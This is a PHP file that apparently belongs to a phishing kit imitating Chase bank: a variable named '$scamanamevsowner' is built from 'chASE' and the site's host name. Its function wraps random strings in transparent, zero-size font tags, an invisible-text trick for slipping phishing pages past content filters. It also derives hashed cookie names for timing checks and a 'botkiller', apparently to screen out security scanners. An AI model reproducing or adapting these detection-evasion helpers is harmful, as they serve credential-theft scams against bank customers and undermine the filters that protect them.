<?php

function rT($type, $lenght) {
    switch ($type) {
        case 'alphabet':
            $pstring = "abcdefghijklmnopqrstuvwxyz";
            $plen = strlen($pstring);
            for ($i = 1; $i <= $lenght; $i++) {
                $start = rand(0,$plen);
                $unik = substr($pstring, $start, 1).rand(11111,99999);
            }
            //return $unik;
            return "<font style='color:transparent;font-size:0px'>".$unik."</font>";
            break;
        case 'ALPHABET':
            $pstring = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            $plen = strlen($pstring);
            for ($i = 1; $i <= $lenght; $i++) {
                $start = rand(0,$plen);
                $unik = substr($pstring, $start, 1).rand(11111,99999);
            }
            //return $unik;
            return "<font style='color:transparent;font-size:0px'>".$unik."</font>";
            break;
        case 'numeric':
            $pstring = "0123456789";
            $plen = strlen($pstring);
            for ($i = 1; $i <= $lenght; $i++) {
                $start = rand(0,$plen);
                $unik = substr($pstring, $start, 1).rand(11111,99999);
            }
            //return $unik;
            return "<font style='color:transparent;font-size:0px'>".$unik."</font>";
            break;
        case 'alphanumeric':
            $pstring = "abcdefghijklmnopqrstuvwxyz0123456789";
            $plen = strlen($pstring);
            for ($i = 1; $i <= $lenght; $i++) {
                $start = rand(0,$plen);
                $unik = substr($pstring, $start, 1).rand(11111,99999);
            }
            //return $unik;
            return "<font style='color:transparent;font-size:0px'>".$unik."</font>";
            break;
        case 'ALPHANUMERIC':
            $pstring = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            $plen = strlen($pstring);
            for ($i = 1; $i <= $lenght; $i++) {
                $start = rand(0,$plen);
                $unik = substr($pstring, $start, 1).rand(11111,99999);
            }
            //return $unik;
            return "<font style='color:transparent;font-size:0px'>".$unik."</font>";
            break;
    };
};


$scamanamevsowner="chASE".$_SERVER['HTTP_HOST'];
$timecookie=strtolower(md5('5075140835d0bc504791c76b04c33d2bck'.'time'.$scamanamevsowner));
$bottime=strtolower(md5('ce114cdc5e387191210f3b519dfb118bck'.'botkiller'.$scamanamevsowner));
$timecookievalue=strtolower(md5('c327b49efdca2668f28cd7b4beee54b3y3r'.'value'.$scamanamevsowner));

?>